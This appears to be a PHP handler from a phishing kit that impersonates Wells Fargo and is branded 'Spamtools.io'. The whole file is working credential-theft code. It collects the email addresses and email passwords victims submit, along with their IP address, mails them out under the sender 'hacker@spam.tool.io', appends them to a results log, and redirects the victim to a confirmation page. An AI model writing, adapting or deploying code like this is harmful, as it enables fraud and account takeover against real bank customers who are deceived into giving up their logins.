<?php
error_reporting(0);

include 'email.php';
session_start();
include ('bt.php');
include 'config.php';
$ib = getenv("REMOTE_ADDR");
$random=rand(0,100000000000);
$ran = md5($random);
$_SESSION[$ran] = $random;
$random=rand(0,100000000000);
$rans = md5($random);
$_SESSION[$rans] = $random;
$ip = getenv("REMOTE_ADDR");
$message .= "------[Wellsfargo - Spamtools.io]------\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Email Password : ".$_POST['emailpass']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Email access-------------\n";
$from = "hacker@spam.tool.io";
    $subject = " Wellsfargo Email Access: ".$ip."\n"; 
    mail($send, $subject, $message, $from);m();


$milaf = fopen("../results/login.txt","a");
fwrite($milaf,$message);	

		   redirect("confirm.php");

		   


?>